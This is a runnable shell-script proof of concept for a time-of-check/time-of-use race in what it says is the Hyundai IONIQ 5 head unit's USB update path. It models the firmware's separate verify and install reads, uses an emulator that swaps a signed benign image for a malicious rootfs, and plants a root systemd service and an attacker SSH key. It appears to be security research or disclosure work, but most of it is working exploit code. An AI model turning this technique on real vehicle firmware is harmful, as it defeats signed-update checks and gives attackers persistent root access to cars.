#!/bin/sh
# TOCTOU PoC for the IONIQ 5 USB update path — runnable, no car required.
#
# Reproduces AppUpgrade's EXACT two-pass pattern on one USB file:
#   CHECK pass:  md5sum %1   +   RSA "PKCS#1 sig. verify" over the content
#   USE   pass:  (DecryptToPIPE %1 | tar)  /  dd if=%1      <-- separate process, re-opens %1
# The media is a dynamic USB emulator that swaps benign->malicious the moment the verify
# read completes. Demonstrates: the signed check PASSES on benign bytes, the install
# CONSUMES malicious bytes. No RSA private key is used to sign anything malicious.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
W=$(mktemp -d)
MEDIA="$W/usb/mango-rootfs.tar.gz"     # the file as it appears at /media/usb/.../HU/images/
mkdir -p "$W/usb" "$W/install" "$W/keys"

echo "=============================================================="
echo " IONIQ5 USB-update TOCTOU PoC   (workdir $W)"
echo "=============================================================="

# --- OEM signing key: models the key credman/AppUpgrade verifies against. ---
# The attacker NEVER has the private key; it only signs the GENUINE benign image,
# exactly as the real OEM already did. We generate one here only so we can run a real
# openssl verify step end to end.
openssl genrsa -out "$W/keys/oem_priv.pem" 2048 >/dev/null 2>&1
openssl rsa -in "$W/keys/oem_priv.pem" -pubout -out "$W/keys/oem_pub.pem" >/dev/null 2>&1

# --- Build BENIGN image (what the OEM signed) and MALICIOUS image (attacker rootfs). ---
mkdir -p "$W/benign_root/etc" "$W/evil_root/etc/systemd/system" "$W/evil_root/root/.ssh"
echo "stock rootfs file" > "$W/benign_root/etc/stock-marker"
( cd "$W/benign_root" && tar -czf "$W/benign.tar.gz" . )
# malicious rootfs: adds a root-run service + an authorized_keys (the old 'D2' content)
cat > "$W/evil_root/etc/systemd/system/wideopen.service" <<'EOF'
[Unit]
Description=pwn
[Service]
ExecStart=/bin/sh -c 'id > /root/PWNED_BY_TOCTOU'
[Install]
WantedBy=multi-user.target
EOF
echo "ssh-ed25519 AAAA...attacker-key... attacker@toctou" > "$W/evil_root/root/.ssh/authorized_keys"
echo "INSTALLED_FROM_MALICIOUS_IMAGE" > "$W/evil_root/etc/TOCTOU_PROOF"
( cd "$W/evil_root" && tar -czf "$W/evil.tar.gz" . )

# --- OEM signs the BENIGN image (md5WithRSAEncryption analog: RSA over the digest). ---
BENIGN_MD5=$(md5sum "$W/benign.tar.gz" | awk '{print $1}')
openssl dgst -sha256 -sign "$W/keys/oem_priv.pem" -out "$W/benign.sig" "$W/benign.tar.gz"
echo "[OEM] signed the genuine benign image.  benign md5=$BENIGN_MD5"
EVIL_MD5=$(md5sum "$W/evil.tar.gz" | awk '{print $1}')
echo "[atk] malicious image md5=$EVIL_MD5  (NOT signed, NO private key used)"
echo

# --- Start the dynamic USB emulator: serves benign, swaps to evil after verify read. ---
READY="$W/ready"; SWAPPED="$W/swapped"; rm -f "$READY" "$SWAPPED"
# verify phase = md5sum (1 open) + openssl verify (1 open) = 2 read-closes -> arm_after=2
python3 "$HERE/usb_emulator.py" "$MEDIA" "$W/benign.tar.gz" "$W/evil.tar.gz" "$READY" "$SWAPPED" 2 &
EMU=$!
# wait until emulator is serving benign
while [ ! -f "$READY" ]; do :; done

echo "---- CHECK pass (what AppUpgrade does before install) --------"
# firmware: ionice -c3 md5sum %1 | awk '{print $1}'
GOT_MD5=$(md5sum "$MEDIA" | awk '{print $1}')
# firmware: PKCS#1 sig. verify  (openssl models the RSA verify credman performs)
if openssl dgst -sha256 -verify "$W/keys/oem_pub.pem" -signature "$W/benign.sig" "$MEDIA" >/dev/null 2>&1; then SIG=OK; else SIG=FAIL; fi
echo "   md5sum(media)      = $GOT_MD5"
echo "   expected (signed)  = $BENIGN_MD5"
echo "   RSA sig. verify    = $SIG"
if [ "$GOT_MD5" = "$BENIGN_MD5" ] && [ "$SIG" = "OK" ]; then
  echo "   => CHECK PASSED (media looked like the genuine signed image)"
else
  echo "   => check failed (unexpected); aborting"; kill $EMU 2>/dev/null || true; exit 1
fi

# emulator swaps to malicious now (triggered by the verify read-closes above)
while [ ! -f "$SWAPPED" ]; do :; done
echo
echo "---- USE pass (separate process re-opens the SAME path) ------"
# firmware: /app/share/AppUpgrade/DecryptToPIPE %1 | tar -xvm -C %2   (here: tar extract)
#           (DecryptToPIPE would AES-decrypt first; omitted — same re-open semantics)
dd if="$MEDIA" of="$W/installed.tar.gz" bs=4k status=none    # firmware also: dd if=%1 ...
tar -xzf "$W/installed.tar.gz" -C "$W/install"
INST_MD5=$(md5sum "$W/installed.tar.gz" | awk '{print $1}')
echo "   installer read md5 = $INST_MD5"
echo

echo "---- RESULT --------------------------------------------------"
if [ -f "$W/install/etc/TOCTOU_PROOF" ] && [ -f "$W/install/etc/systemd/system/wideopen.service" ]; then
  echo "   [WIN] Installed partition contains the MALICIOUS rootfs:"
  echo "         $(cat "$W/install/etc/TOCTOU_PROOF")"
  echo "         + root service: etc/systemd/system/wideopen.service"
  echo "         + $(head -c 40 "$W/install/root/.ssh/authorized_keys")..."
  echo "   Signature check PASSED on benign bytes (md5 $BENIGN_MD5, sig OK),"
  echo "   installer CONSUMED malicious bytes (md5 $INST_MD5)."
  echo "   >>> TOCTOU race won: verified A, installed B. No private key, no forgery."
  RC=0
else
  echo "   [LOSE] install dir has stock content; race not won this run."; RC=2
fi
kill $EMU 2>/dev/null || true
echo "=============================================================="
exit $RC
